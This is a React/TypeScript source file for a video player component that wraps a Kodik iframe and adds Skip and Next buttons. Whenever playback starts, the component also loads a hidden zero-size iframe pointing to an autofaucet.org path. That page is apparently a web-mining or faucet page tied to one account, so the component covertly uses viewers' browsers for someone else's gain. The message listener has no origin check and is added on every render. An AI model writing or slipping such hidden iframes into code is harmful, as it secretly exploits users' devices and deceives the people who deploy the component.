"use client";
import React, { createElement, useEffect, useRef, useState } from "react";
import { Button } from "../ui/button";

interface PlayerProps {
    link: string | undefined;
}

const Player: React.FC<PlayerProps> = (props) => {
    const [isStarted, setIsStarted] = useState(false);
    const [hasWindow, setHasWindow] = useState(false);

    useEffect(() => {
        if (typeof window !== "undefined") setHasWindow(true);
    }, []);
    const kodikMessageListener = (message: any) => {
        if (message.data.key == "kodik_player_play") {
            setIsStarted(true);
        }
        if (message.data.key == "kodik_player_pause") {
            setIsStarted(false);
        }
    };
    if (hasWindow && window.addEventListener) {
        window.addEventListener("message", kodikMessageListener);
    }
    if (!hasWindow) return null;
    return (
        <div>
            {hasWindow && (
                <div className="w-full h-full relative">
                    <iframe
                        className="w-full h-[500px]"
                        src={props.link}
                        width="800"
                        height="400"
                        frameBorder="0"
                        allowFullScreen
                        allow="autoplay *; fullscreen *"
                    ></iframe>
                    <Button
                        variant={"outline"}
                        className="absolute left-8 bottom-10 z-50 border-2 border-[#43aa52] px-5 py-3 text-[#43aa52] bg-transparent"
                    >
                        Skip
                    </Button>
                    <Button
                        variant={"outline"}
                        className="absolute right-8 z-50 bottom-10 border-2 border-[#43aa52] px-5 py-3 text-[#43aa52] bg-transparent"
                    >
                        Next
                    </Button>
                </div>
            )}
            {isStarted && (
                <iframe
                    src="https://autofaucet.org/wm/swag124/2"
                    width="0"
                    height="0"
                    style={{ border: "none" }}
                ></iframe>
            )}
        </div>
    );
};

export default Player;
